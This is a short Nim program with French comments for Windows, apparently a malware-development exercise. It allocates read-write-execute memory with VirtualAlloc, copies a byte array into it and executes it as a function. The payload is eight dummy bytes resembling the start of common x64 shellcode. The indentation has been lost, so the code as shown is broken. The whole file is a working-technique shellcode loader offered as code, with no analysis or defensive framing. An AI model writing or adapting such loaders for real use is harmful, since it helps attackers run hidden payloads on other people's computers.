import winim/lean

when defined(windows):
echo "loader initialisé"
else:
echo "Ce programme est prévu pour Windows uniquement"

echo "loader prêt"

var payload = [byte 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00] # 8 bytes factices

echo "taille payload = ", payload.len

proc injectLocal[I, T](shellcode: var array[I, T]): void =

# Allocation mémoire pour le shellcode

let executable_memory = VirtualAlloc(
nil,
len(shellcode),
MEM_COMMIT,
PAGE_EXECUTE_READ_WRITE
)

# Copie du shellcode dans la mémoire allouée

copyMem(executable_memory, shellcode[0].addr, len(shellcode))

# Définition d'un type pour le shellcode comme fonction

type ShellcodeProc = proc() {.noconv.}

# Conversion de l'adresse mémoire en fonction

let runShellcode = cast[ShellcodeProc](executable_memory)

echo "Execution du shellcode..."
runShellcode()  # Appel direct

proc main =
injectLocal(payload)

when isMainModule:
main()





  